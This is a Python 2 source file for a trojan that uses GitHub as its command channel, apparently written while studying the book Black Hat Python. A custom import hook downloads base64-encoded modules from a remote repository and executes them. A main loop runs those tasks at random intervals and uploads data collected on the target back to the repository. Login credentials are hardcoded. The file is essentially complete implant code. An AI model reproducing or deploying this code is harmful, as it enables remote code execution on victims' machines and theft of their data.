import json
import base64
import sys
import time
import imp
import random
import threading
import Queue
import os

from github3 import login

trojan_id = "abc"

trojan_config = "trojan/config/%s.json" % trojan_id
data_path     = "trojan/data/%s/" % trojan_id
trojan_modules= []
configured    = False
task_queue    = Queue.Queue()


# custom loading class to load external lib
# Every time the interpreter attempts to load a module that is not available, this class is used.
class GitImporter(object):

    def __init__(self):
        self.current_module_code = ""

    # this function is called first.
    def find_module(self, fullname, path=None):
        if configured:
            print "[*] Attempting to retrieve %s" % fullname
            # pass this call to remote file loader
            new_library = get_file_contents("trojan/modules/%s" % fullname)

            if new_library is not None:
                # if can locate the file in repo, base64-decode the code and store it in class
                self.current_module_code = base64.b64decode(new_library)
                # returning 'self' makes interpreter can call 'load_module' function to actually load it.
                return self
        return None

    def load_module(self, name):
        # creating empty module
        module = imp.new_module(name)
        # shovel the code from GitHub into this
        exec self.current_module_code in module.__dict__
        # insert newly created module into the system module list
        sys.modules[name] = module
        return module


# core interaction between the trojan and GitHub.
def connect_to_github():
    # change username to git ID and password to git password
    # Also, should obfuscate this authentication procedure
    gh = login(username="ibocon", password="passwd")
    repo = gh.repository("ibocon", "study-BlackHatPython")
    branch = repo.branch("master")

    return gh, repo, branch


# responsible for grabbing files from the remote repo, and reading the content locally.
# used both for reading config opt as well as reading module source code.
def get_file_contents(filepath):

    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.recurse()

    for filename in tree.tree:
        if filepath in filename.path:
            print "[*] Found file %s" % filepath
            blob = repo.blob(filename._json_data['sha'])
            return blob.content

    return None


# responsible for retrieving the remote configuration document from the repo
# so that this trojan knows which modules to run.
def get_trojan_config():
    global configured
    config_json   = get_file_contents(trojan_config)
    config        = json.loads(base64.b64decode(config_json))
    configured    = True

    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])

    return config


# This function is used to push any data that collected on the target.
def store_module_result(data):

    gh, repo, branch = connect_to_github()
    remote_path = "trojan/data/%s/%d.data" % (trojan_id, random.randint(1000, 100000))
    repo.create_file(remote_path, "Commit message", base64.b64encode(data))

    return


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    # store the result in repo
    store_module_result(result)

    return

# main trojan loop

# add custom module importer before begin the main loop
sys.meta_path = [GitImporter()]

while True:

    if task_queue.empty():
        # grab config from the repo
        config = get_trojan_config()

        for task in config:
            # start its own thread
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))

    time.sleep(random.randint(1000, 10000))